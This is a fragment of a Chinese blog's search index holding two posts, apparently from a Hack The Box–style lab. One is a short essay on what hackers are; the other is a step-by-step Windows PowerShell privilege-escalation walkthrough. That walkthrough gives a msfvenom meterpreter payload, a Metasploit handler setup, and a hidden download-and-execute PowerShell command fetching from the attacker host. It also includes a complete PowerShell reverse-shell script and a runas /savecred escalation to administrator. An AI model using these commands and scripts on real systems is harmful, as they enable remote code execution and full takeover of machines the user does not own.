      <url>/2019/02/19/%E6%88%91%E4%BB%AC%E7%9C%9F%E7%9A%84%E6%87%82%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%91%E5%AE%A2%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="黑客是什么？"><a href="#黑客是什么？" class="headerlink" title="黑客是什么？ "></a><center>黑客是什么？ </center></h2><p>&emsp;&emsp; 黑客是什么？是映像中坐在电脑面前快速疯狂的敲几下键盘，就能黑了一台又一台的主机，甚至像出入自家院子一样随意的进入深网（有时“深网”这一术语被错误地用于指代暗网，其实不然前者指的是存在于黑暗网络、覆盖网络上的万维网内容，只能用特殊软件、特殊授权、或对计算机做特殊设置才能访问。暗网构成了深网的一小部分，深网网络没有被网络搜索引擎索引，后者指的是搜索引擎未索引（不能搜索到）的万维网内容）。<br><br>&emsp;&emsp;黑客</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows渗透之powershell提权</title>
      <link href="/2019/02/18/windows%E6%B8%97%E9%80%8F%E4%B9%8Bpowershell%E6%8F%90%E6%9D%83/"/>
      <url>/2019/02/18/windows%E6%B8%97%E9%80%8F%E4%B9%8Bpowershell%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p></p><h3>windows渗透之powershell提权</h3><p></p><p></p><h5>攻击机:10.10.14.158</h5><p></p><p></p><h5>服务器:10.10.10.98</h5><br>今天朋友给了个只有telnet权限的账号让我帮忙提权，我进去发现服务器禁止了.exe程序执行，只能执行部分系统指令，发现powershell可能唯一突破口，但同样对运行权限做了一定的限制。常用的Set-ExecutionPolicy Unrestricted限制熬过等指令都需要管理员权限。提权的关键在于Runas命令，其中runas带有 /savecred参数，能够以保存的用户凭据执行命令。<br>这时候我就想到通过ps1文件来远程服务器，方便以后上传下载文件。<br>一、使用msfvenom生成PS1文件：<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt;  -f psh-reflection &gt;shell.ps1</code><br>二、开启Msf监听：<br><code>msf &gt; use exploit/multi/handler</code><br><code>msf exploit(handler) &gt; set payload</code><br><code>windows/x64/meterpreter/reverse_tcp</code><br><code>payload =&gt; windows/meterpreter/reverse_tcp</code><br><code>msf exploit(handler) &gt; set lhost 10.10.14.158</code><br><code>lhost =&gt; 10.10.14.158</code><br><code>msf exploit(handler) &gt; set lport 4444</code><br><code>lport =&gt; 4444</code><br><code>msf &gt; run</code><br>三、在攻击机开启http服务器：<br><code>python -m SimpleHTTPServer 8000</code><br>四、在目标机器执行cmd命令：<br><code>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.158:8000/shell.ps1&#39;);xx.ps1&quot;</code><br>五、上传GetRoot.ps1脚本<br><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.158&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code><br>六、使用GetRoot.ps脚本提权。<br>脚本上传完成后，打开nc监听攻击机子的6666端口<br>然后在服务器上执行命令<code>runas /user:administrator /savecred &quot;powershell -ExecutionPolicy ByPass -File C:\Users\Public\GetRoot.ps1&quot;</code><br>这时候nc监听的窗口会自动转服务器的Adminsistrator账号。<p></p>]]></content>
      
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
